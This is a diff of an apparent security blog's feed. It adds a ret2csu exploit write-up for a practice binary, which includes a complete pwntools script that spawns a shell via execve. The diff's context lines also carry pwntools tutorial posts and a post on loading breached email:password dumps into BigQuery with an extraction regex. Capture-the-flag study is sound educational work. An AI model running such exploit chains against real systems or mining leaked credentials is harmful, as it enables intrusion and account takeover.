+</code></pre></div><h3 id="__libc_csu_init"><code>__libc_csu_init</code></h3>
+<p>When sending the previous code, the program will receive more input, which will contain the string
+<code>/bin/sh\x00</code> and store it at <code>ptr_bin_sh</code>. We now have a known address for the location of the
+first argument to <code>execve</code>.</p>
+<p>Let&rsquo;s build the <code>csu</code> portion of the payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">+=</span> p64(csu_one)             <span style="color:#75715e"># kick off register-setup with ret2csu</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbx</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbp</span>
+payload <span style="color:#f92672">+=</span> p64(ptr_syscall)         <span style="color:#75715e"># pop r12 -(stage 2)-&gt; call [r12+rbx*8]</span>
+payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># pop r13 -(stage 2)-&gt; rdi</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r14 -(stage 2)-&gt; rsi</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r15 -(stage 2)-&gt; rdx</span>
+<span style="color:#75715e"># ret</span>
+payload <span style="color:#f92672">+=</span> p64(csu_two)             <span style="color:#75715e"># stage 2 finishes -&gt; register setup</span>
+io<span style="color:#f92672">.</span>sendling(payload)
+</code></pre></div><p>We&rsquo;ll use the same strategy for creating <code>ptr_syscall</code> that we did for <code>ptr_bin_sh</code>. We&rsquo;ll pass it
+in later, during the first read.</p>
+<p>At this point, we could send the payload. This will trigger a <code>read</code>, we can pass in our second
+stage and populate the arguments we&rsquo;d need for execution during the second half of the exploit.</p>
+<p>The secondary payload contains the 8-byte string for <code>&quot;/bin/sh\x00&quot;</code> followed by the syscall
+address. We&rsquo;ll tack on a padding of null bytes until we reach a length of 59. This is because we&rsquo;ll
+be jumping to <code>syscall</code> and we need <code>rax</code> to equal 59 when we do. The return value of <code>read</code> is the
+length of the payload, which we control, and is stored at <code>rax</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">syscall <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;syscall&#39;</span>)))
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+payload <span style="color:#f92672">+=</span> p64(syscall)
+payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(c<span style="color:#f92672">.</span>SYS_execve, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># c is pwnlib.constants</span>
+
+io<span style="color:#f92672">.</span>send(payload)
+io<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Let&rsquo;s put it all together</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> context, gdb, log, args, remote, process, p64, asm, constants <span style="color:#66d9ef">as</span> c
+<span style="color:#f92672">import</span> sys
+
+usage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    sploit.py &lt;BIN&gt; [REMOTE=x.x.x.x:yy] [GDB,DEBUG]
+</span><span style="color:#e6db74">    GDB     Enables use of GDB during exploit development. Require tmux
+</span><span style="color:#e6db74">    DEBUG   Enables debug logging in pwntool
+</span><span style="color:#e6db74">    REMOTE= Set the host and port to which the exploit will be sent
+</span><span style="color:#e6db74">            GDB cannot be used with this mode
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+BIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./system_drop&#34;</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init</span>(gdbrc):
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">and</span> BIN <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
+        log<span style="color:#f92672">.</span>warn(usage)
+        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+    binary <span style="color:#f92672">=</span> BIN <span style="color:#f92672">or</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+    context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary
+    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+        HOST, PORT <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>REMOTE<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#ae81ff">1</span>)
+        <span style="color:#66d9ef">return</span> remote(HOST, PORT)
+    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>GDB:
+        <span style="color:#75715e"># context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;, &#34;-p&#34;, &#34;75&#34;]</span>
+        context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;tmux&#34;</span>, <span style="color:#e6db74">&#34;neww&#34;</span>]
+        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug(binary, gdbrc)
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">return</span> process(binary)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(io):
+    <span style="color:#75715e"># import ipdb;ipdb.set_trace(context=5)</span>
+    limit <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>
+    e <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary
+
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    0x004005ca      pop rbx
+</span><span style="color:#e6db74">    0x004005cb      pop rbp
+</span><span style="color:#e6db74">    0x004005cc      pop r12
+</span><span style="color:#e6db74">    0x004005ce      pop r13
+</span><span style="color:#e6db74">    0x004005d0      pop r14
+</span><span style="color:#e6db74">    0x004005d2      pop r15
+</span><span style="color:#e6db74">    0x004005d4      ret
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    csu_one <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005ca</span>
+
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    0x004005b0      mov rdx, r15       ; char **ubp_av
+</span><span style="color:#e6db74">    0x004005b3      mov rsi, r14       ; int argc
+</span><span style="color:#e6db74">    0x004005b6      mov edi, r13d      ; func main
+</span><span style="color:#e6db74">    0x004005b9      call qword [r12 + rbx*8]
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    csu_two <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005b0</span>
+
+    pop_rsi_r15_ret <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;pop rsi; pop r15; ret&#39;</span>)))
+    ptr_bin_sh <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>bss()
+    ptr_syscall <span style="color:#f92672">=</span> ptr_bin_sh <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>limit
+    payload <span style="color:#f92672">+=</span> p64(pop_rsi_r15_ret)     <span style="color:#75715e"># prepare additional `read`</span>
+    payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># rsi - read dest</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadc0de</span>)          <span style="color:#75715e"># r15 - junk</span>
+    <span style="color:#75715e"># ret</span>
+    payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read)          <span style="color:#75715e"># read in bin/sh and syscall to .bss</span>
+    <span style="color:#75715e"># ret</span>
+    payload <span style="color:#f92672">+=</span> p64(csu_one)             <span style="color:#75715e"># kick off register setup with ret2csu</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbx</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop rbp</span>
+    payload <span style="color:#f92672">+=</span> p64(ptr_syscall)         <span style="color:#75715e"># pop r12 -&gt; call [r12+rbx*8]</span>
+    payload <span style="color:#f92672">+=</span> p64(ptr_bin_sh)          <span style="color:#75715e"># pop r13 -&gt; rdi</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r14 -&gt; rsi</span>
+    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)                   <span style="color:#75715e"># pop r15 -&gt; rdx</span>
+    <span style="color:#75715e"># ret</span>
+    payload <span style="color:#f92672">+=</span> p64(csu_two)             <span style="color:#75715e"># stage 2 finishes -&gt; register setup</span>
+    io<span style="color:#f92672">.</span>sendline(payload)
+
+    syscall <span style="color:#f92672">=</span> next(e<span style="color:#f92672">.</span>search(asm(<span style="color:#e6db74">&#39;syscall&#39;</span>)))
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> p64(syscall)
+    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(c<span style="color:#f92672">.</span>SYS_execve, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+    io<span style="color:#f92672">.</span>send(payload)
+    io<span style="color:#f92672">.</span>interactive()
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    gdbrc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    # b read
+</span><span style="color:#e6db74">    # b *__libc_csu_init+73
+</span><span style="color:#e6db74">    # c
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    io <span style="color:#f92672">=</span> init(gdbrc)
+    main(io)
+</code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>Password Dump Database - Part 2</title>
@@ -40,22 +897,22 @@ This ended up being just enough to upload, parse, and insert the dump data I had
 The start of my journey began here: <a href="https://cloud.google.com/bigquery/docs/quickstarts/quickstart-command-line">https://cloud.google.com/bigquery/docs/quickstarts/quickstart-command-line</a></p>
 <p>With my account activated, I moved on to preparing my data, pulling out emails and
 passwords from dumps using <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rg --no-filename -a -o -f ./email.regex ../collections1-5/ &gt;&gt; all.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rg --no-filename -a -o -f ./email.regex ../collections1-5/ &gt;&gt; all.txt
   <span style="color:#75715e"># -a - reach into binary (non-text) data</span>
   <span style="color:#75715e"># -o - only print matches, not entire lines</span>
   <span style="color:#75715e"># -f [file] - a path to a file containing a regex pattern with which to match</span>
 </code></pre></div><p>This nasty piece of regex right here is what <code>ripgrep</code> will match while poring over the data:</p>
-<pre><code class="language-regex" data-lang="regex">(?i)(?:[a-z0-9!#$%&amp;'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*|&quot;(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*&quot;)@(?i)(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])[:|;](?:[a-z0-9!\]\[&lt;&gt;@#\(\):$%&amp;\\&quot;'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*|&quot;(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*&quot;)
+<pre tabindex="0"><code class="language-regex" data-lang="regex">(?i)(?:[a-z0-9!#$%&amp;'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*|&quot;(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*&quot;)@(?i)(?:(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?|\[(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?|[a-z0-9-]*[a-z0-9]:(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21-\x5a\x53-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])+)\])[:|;](?:[a-z0-9!\]\[&lt;&gt;@#\(\):$%&amp;\\&quot;'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&amp;'*+/=?^_`{|}~-]+)*|&quot;(?:[\x01-\x08\x0b\x0c\x0e-\x1f\x21\x23-\x5b\x5d-\x7f]|\\[\x01-\x09\x0b\x0c\x0e-\x7f])*&quot;)
 </code></pre><p>Next, I needed to turn my extracted data into a CSV file for consumption by BigQuery.
 I needed to turn <code>user@domain.com:password</code> into <code>user,domain,password</code>.
 You&rsquo;re most welcome to <code>sed | awk | grep | cut</code> your way into the Annals of Leet-dom, but I used
 DataPrep.</p>
 <p>BigQuery, while technically able to ingest CSV straight from your computer using the CLI client like so:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bq load --quote <span style="color:#e6db74">&#34;&#34;</span> --allow_jagged_rows --field_delimiter tab --source_format CSV <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dataset_name<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>table_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;gs://</span><span style="color:#e6db74">${</span>project_name<span style="color:#e6db74">}</span><span style="color:#e6db74">/all.csv&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bq load --quote <span style="color:#e6db74">&#34;&#34;</span> --allow_jagged_rows --field_delimiter tab --source_format CSV <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dataset_name<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span>table_name<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;gs://</span><span style="color:#e6db74">${</span>project_name<span style="color:#e6db74">}</span><span style="color:#e6db74">/all.csv&#34;</span>
 </code></pre></div><p>I had an internet hiccup during upload and had to start over. RIP a portion of my $300 budget.
 If doing this again, I&rsquo;d upload to Storage instead.
 Both BigQuery and Dataprep allow Storage buckets as sources.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gsutil -o GSUtil:parallel_composite_upload_threshold<span style="color:#f92672">=</span>40G cp all.txt <span style="color:#e6db74">&#34;gs://</span><span style="color:#e6db74">${</span>project_name<span style="color:#e6db74">}</span><span style="color:#e6db74">/&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gsutil -o GSUtil:parallel_composite_upload_threshold<span style="color:#f92672">=</span>40G cp all.txt <span style="color:#e6db74">&#34;gs://</span><span style="color:#e6db74">${</span>project_name<span style="color:#e6db74">}</span><span style="color:#e6db74">/&#34;</span>
   <span style="color:#75715e"># -o [option] here will allow concurrent uploads</span>
 </code></pre></div><p>I popped on over to the Dataprep service and enjoyed the nice walk-through.
 When ready to get started, I imported my dataset from Storage and started massaging the data.</p>
@@ -64,7 +921,7 @@ When ready to get started, I imported my dataset from Storage and started massag
 because I noticed the option to export the job results <strong>directly</strong> to BigQuery.
 So useful.
 My job took around 24 hours to run.</p>
-<pre><code>Stats for passdb
+<pre tabindex="0"><code>Stats for passdb
 ========================================
 Bytes:   150057615285
 Rows:    3658006353
@@ -112,7 +969,7 @@ self-host after all (<em>sans</em> normalization, but oh well)! Time for an alte
             <content type="html"><![CDATA[<p>Before we start, in part 2 of the series I demonstrated finding asm instructions within a binary
 using the <code>elf.search()</code> function. We passed bytes <code>ff e4</code> in order to find the address of a <code>jmp rsp</code> instruction. As it turns out, we can use also the mnemonic if we pass it through <code>asm()</code> first.
 This way, we don&rsquo;t have to remember that <code>jmp rsp</code> is <code>ff e4</code> on amd64 architecture.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
 <span style="color:#e6db74">&#34;&#34;&#34; From yesterday &#34;&#34;&#34;</span>
 In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;pwnable&#39;</span>)
 In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xe4</span><span style="color:#e6db74">&#34;</span>))
@@ -142,7 +999,7 @@ reversing and bug-hunting barriers and tell you outright that the overflow lengt
 challenge is 40. As a former teacher, I approve of this method. We&rsquo;ll use this known-good value of
 40 to test with.</p>
 <p>To automatically find the offset:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>)
 In [<span style="color:#ae81ff">3</span>]: io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2win&#39;</span>)
 In [<span style="color:#ae81ff">4</span>]: io<span style="color:#f92672">.</span>recv()
@@ -161,7 +1018,7 @@ In [<span style="color:#ae81ff">8</span>]: cyclic_find(coredump<span style="colo
 Out[<span style="color:#ae81ff">8</span>]: <span style="color:#ae81ff">40</span>
 </code></pre></div><p>Here&rsquo;s what a fully automated exploit might look like using what we&rsquo;ve learned from the past 3
 posts.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;amd64&#34;</span>
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">overflow</span>(io, data):
@@ -182,7 +1039,7 @@ io <span style="color:#f92672">=</span> process(exe)
 overflow(io, payload)
 success( io<span style="color:#f92672">.</span>recvline() )
 </code></pre></div><p>Output:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">dev ❯❯ python exp.py
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">dev ❯❯ python exp.py
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./ret2win&#39;</span>: pid <span style="color:#ae81ff">1248672</span>
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;./ret2win&#39;</span> stopped with exit code -11 <span style="color:#f92672">(</span>SIGSEGV<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>pid 1248672<span style="color:#f92672">)</span>
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Parsing corefile...: Done
@@ -215,7 +1072,7 @@ buf_len = 128 pad_len = buf_len - (len(gadgets) + len(mprotect)) payload = gadge
 <h3 id="fit">fit</h3>
 <p>One of the Class-level members I want to talk about is <code>fit</code>. I&rsquo;ve had to create lines in my
 exploit code that look like this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span>
 pad_len <span style="color:#f92672">=</span> buf_len <span style="color:#f92672">-</span> (len(gadgets) <span style="color:#f92672">+</span> len(mprotect))
 
 payload  <span style="color:#f92672">=</span> gadgets
@@ -227,7 +1084,7 @@ payload <span style="color:#f92672">+=</span> jmprsp
 </code></pre></div><p><code>fit</code> allows you to be declarative about where each of your exploit components should be in your
 payload.</p>
 <p>The same payload, using <code>fit</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> fit({
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> fit({
         <span style="color:#ae81ff">0</span>: gadgets,
         <span style="color:#ae81ff">8</span>: mprotect,
         <span style="color:#ae81ff">128</span>: canary,
@@ -238,7 +1095,7 @@ that <code>cyclic</code> uses, so if your binary crashes during the exploit, the
 crash screen of GDB can be inserted into <code>cyclic_find</code> and it will tell you where the cause of the
 crash is in your payload. Much like using <code>pattern_create</code> to find an initial buffer length. I&rsquo;ll
 go into <code>cyclic</code> in another blog post.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 In [<span style="color:#ae81ff">2</span>]: exp <span style="color:#f92672">=</span> fit({
    <span style="color:#f92672">...</span>:     <span style="color:#ae81ff">4</span>: <span style="color:#e6db74">&#34;ZZZZ&#34;</span>,
    <span style="color:#f92672">...</span>:     <span style="color:#ae81ff">12</span>: <span style="color:#e6db74">&#34;XXXX&#34;</span>
@@ -250,7 +1107,7 @@ Out[<span style="color:#ae81ff">3</span>]: <span style="color:#e6db74">&#39;aaaa
 <p><code>symbols</code> will return a <code>dotdict</code> of symbol-to-address mappings. <code>sym</code> is a convenience
 alias to <code>symbols</code>. A <code>dotdict</code> is a class within <code>pwntools</code> that allows dotted access to the
 underlying python <code>dict</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;pwnable&#34;</span>)
 In [<span style="color:#ae81ff">3</span>]: e<span style="color:#f92672">.</span>symbols
 Out[<span style="color:#ae81ff">3</span>]:
@@ -269,12 +1126,12 @@ Out[<span style="color:#ae81ff">4</span>]: <span style="color:#ae81ff">4198480</
 <p><code>search</code> takes a sequence of bytes and returns an iterator of possible matches. Handy if you want
 to get the location of say &ldquo;/bin/sh&rdquo; inside of <code>libc</code>, or even just to find specific instructions
 you might want to use in your payload.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/libc.so.6&#39;</span>)
 In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
 Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">1618340</span>
 </code></pre></div><p>Finding a JMP RSP (<code>ff e4</code>) instruction:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;pwnable&#39;</span>)
 In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xe4</span><span style="color:#e6db74">&#34;</span>))
 Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</span>
@@ -282,7 +1139,7 @@ Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</s
 <p>The ROP module facilitates creating ROP chains by creating a python-style call API of sorts for
 calling symbols located in the binary. We&rsquo;ll use <code>mprotect</code> for our example.</p>
 <p>From <code>man 3 mprotect</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">NAME
